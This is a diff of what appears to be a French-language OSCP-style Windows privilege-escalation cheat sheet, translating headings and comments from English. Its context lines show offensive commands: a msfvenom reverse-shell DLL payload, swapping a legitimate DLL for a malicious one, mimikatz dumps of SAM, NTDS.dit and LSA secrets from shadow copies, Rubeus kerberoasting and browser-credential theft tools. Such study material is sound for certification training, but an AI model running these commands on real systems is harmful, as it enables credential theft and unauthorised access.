@@ -1058,7 +1058,7 @@ int main ()
 
 
 ```bash
-# Cross-Compile the C Code to a 64-bit Application
+# Compiler le code C pour Windows 64 bits
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 ```
@@ -1120,7 +1120,7 @@ sc.exe start <ServiceName>
 # Première vérification des privilèges de redémarrage : SeShutdownPrivilege doit être assigné et activé.
 whoami /priv
 
-# Perform the restart
+# Redémarrer le service
 shutdown /r /t 0
 
 ```
@@ -1285,7 +1285,7 @@ BOOL APIENTRY DllMain(
 
 
 ```bash
-# Cross-Compile the DLL
+# Compiler la DLL pour Windows
 x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll
 
 ```
@@ -1312,7 +1312,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -
 ```powershell
 # Apportez le fichier de votre Kali en utilisant un serveur HTTP
 
-# Move the original DLL (back it up if necessary)
+# Déplacer la DLL originale après sauvegarde si nécessaire
 move "C:\path\to\original\DLL.dll" "C:\path\to\backup\DLL.dll"
 
 # Remplacez-le par votre DLL malveillant
@@ -1532,7 +1532,7 @@ c:\unattend.xml
 ```
 
 
-### Searching for VNC Fichiers de mots de passe
+### Rechercher des fichiers de mots de passe VNC
 
 
 <p class="oscp-command-note">Lister les fichiers du répertoire.</p>
@@ -1545,7 +1545,7 @@ dir c:\ /s /b | findstr /si *vnc.ini
 ```
 
 
-## Shadow Copies (SAM, SYSTEM, NTDS.dit, SECURITY, NTUSER.dat)
+## Copies instantanées VSS (SAM, SYSTEM, NTDS.dit, SECURITY, NTUSER.dat)
 
 
 **Paramètres et repères :**
@@ -1596,7 +1596,7 @@ mimikatz # lsadump::sam /sam:"<sam_file>" /system:"<system_file>"
 ```
 
 
-### Accessing NTDS.dit (Active Directory Database)
+### Accéder à NTDS.dit (base Active Directory)
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -1633,7 +1633,7 @@ mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"
 ```
 
 
-### Dumping SECURITY Plongée pour les secrets et les lettres de créances LSA
+### Extraire les secrets LSA depuis la ruche SECURITY
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1668,7 +1668,7 @@ mimikatz # lsadump::secrets /security:"<security_file>" /system:"<system_file>"
 ```
 
 
-### Extraire des lettres de créances spécifiques à l'utilisateur de NTUSER.dat
+### Extraire des données d’authentification utilisateur depuis NTUSER.dat
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1688,7 +1688,7 @@ reg load hku\TempHive <path_to_ntuser.dat>
 ```
 
 
-### Accès à la copie d'ombre de volume général
+### Accéder aux copies instantanées de volume (VSS)
 
 
 
@@ -1707,7 +1707,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\<path_to_file>
 ```
 
 
-## AlwaysElevated Registry Check
+## Vérifier AlwaysInstallElevated dans le Registre
 
 Observer les permissions et la configuration de Windows.
 
@@ -1731,14 +1731,14 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevat
 ```
 
 
-### Interpreting the Results
+### Interpréter les résultats
 
 
 **Paramètres et repères :**
 `1`  
 
 
-### Exploiting the Vulnerability
+### Exploiter la configuration vulnérable
 
 
 **Paramètres et repères :**
@@ -2020,7 +2020,7 @@ Import-Module ./PowerView.ps1
 ```
 
 
-#### Setup
+#### Installation
 
 
 <p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>
@@ -2053,7 +2053,7 @@ PowerSharpPack -seatbelt -Command "AMSIProviders"
 ```
 
 
-#### Included Tools and Code Examples
+#### Outils et exemples de code inclus
 
 
 
@@ -2127,7 +2127,7 @@ PowerSharpPack -SharpChromium
 ```
 
 
-#### Standalone Scripts
+#### Scripts autonomes
 
 
 **Paramètres et repères :**
@@ -2157,7 +2157,7 @@ PowerSharpPack -SauronEye
 ```
 
 
-#### Complémentaire Tools
+#### Outils complémentaires
 
 
 
@@ -2196,7 +2196,7 @@ PowerSharpPack -Watson
 ```
 
 
-#### Execution Tips
+#### Conseils d’exécution
 
 
 
@@ -2211,7 +2211,7 @@ PowerSharpPack -Rubeus -Command "kerberoast /outfile:roasted.txt /domain:example
 `PowerSharpBinaries`  
 
 
-## Potatoes
+## Outils d’usurpation de jeton (famille Potato)
 
 
 <p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
